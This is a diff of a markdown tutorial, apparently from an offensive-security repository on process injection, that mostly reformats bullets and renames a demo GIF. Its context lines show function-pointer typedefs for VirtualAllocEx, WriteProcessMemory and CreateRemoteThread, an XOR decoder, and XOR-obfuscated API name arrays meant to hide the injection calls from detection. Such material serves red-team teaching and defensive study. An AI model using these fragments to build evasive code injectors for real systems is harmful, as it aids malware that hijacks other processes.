@@ -21,19 +21,19 @@ These headers are necessary to use the Windows API functions for process enumera
 #include <iostream>
 ```
 These are function pointer typedefs for some Windows API functions:
-	* VAExType: A typedef for VirtualAllocEx, which allocates memory in the address space of a specified process.
-	* WPMType: A typedef for WriteProcessMemory, which writes data to an area of memory in a specified process.
-	* CRTType: A typedef for CreateRemoteThread, which creates a thread that runs in the virtual address space of another process.
+* VAExType: A typedef for VirtualAllocEx, which allocates memory in the address space of a specified process.
+* WPMType: A typedef for WriteProcessMemory, which writes data to an area of memory in a specified process.
+* CRTType: A typedef for CreateRemoteThread, which creates a thread that runs in the virtual address space of another process.
 ```cpp
 typedef LPVOID(WINAPI* VAExType)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect);
 typedef BOOL(WINAPI* WPMType)(HANDLE  hProcess, LPVOID  lpBaseAddress, LPCVOID lpBuffer, SIZE_T  nSize, SIZE_T* lpNumberOfBytesWritten);
 typedef HANDLE(WINAPI* CRTType)(HANDLE hProcess, LPSECURITY_ATTRIBUTES  lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, DWORD lpThreadId);
 ```
 This function applies a simple XOR encoding/decoding to the input data using a key.
-	* data: Pointer to the data that needs to be decoded.
-	* data_len: Length of the data.
-	* key: Key used for XOR operations.
-	* key_len: Length of the key.
+* data: Pointer to the data that needs to be decoded.
+* data_len: Length of the data.
+* key: Key used for XOR operations.
+* key_len: Length of the key.
 ```cpp
 void XOR(unsigned char* data, size_t data_len, const char* key, size_t key_len) {
 	int j = 0;
@@ -60,9 +60,9 @@ This line loads the kernel32.dll library into the process's address space. This 
 library = GetModuleHandle(L"kernel32.dll");
 ```
 These arrays contain obfuscated byte with key `offensivepanda` representations of the API function names. Each array represents a different function:
-	* sVAEx for VirtualAllocEx
-	* sWPM for WriteProcessMemory
-	* sCRT for CreateRemoteThread
+* sVAEx for VirtualAllocEx
+* sWPM for WriteProcessMemory
+* sCRT for CreateRemoteThread
 ```cpp
 unsigned char sVAEx[] = { 0x39, 0x0f, 0x14, 0x11, 0x1b, 0x12, 0x05, 0x37, 0x09, 0x1c, 0x0e, 0x0d, 0x21, 0x19 };
 unsigned char sWPM[] = { 0x38, 0x14, 0x0f, 0x11, 0x0b, 0x23, 0x1b, 0x19, 0x06, 0x15, 0x12, 0x1d, 0x29, 0x04, 0x02, 0x09, 0x14, 0x1c };
@@ -513,7 +513,7 @@ int main(int argc, char* argv[]) {
 
 ## Demonstration
 
-![](Assets/ccir.gif)
+![](Assets/apiobf.gif)
 
 For GitHub-Repo Click Here: [Offensive-Panda/ProcessInjectionTechniques](https://github.com/Offensive-Panda/ProcessInjectionTechniques/tree/main/Classic_Code_Injection_API_Obfuscate/Classic_Code_Injection_API_Obfuscate)
 
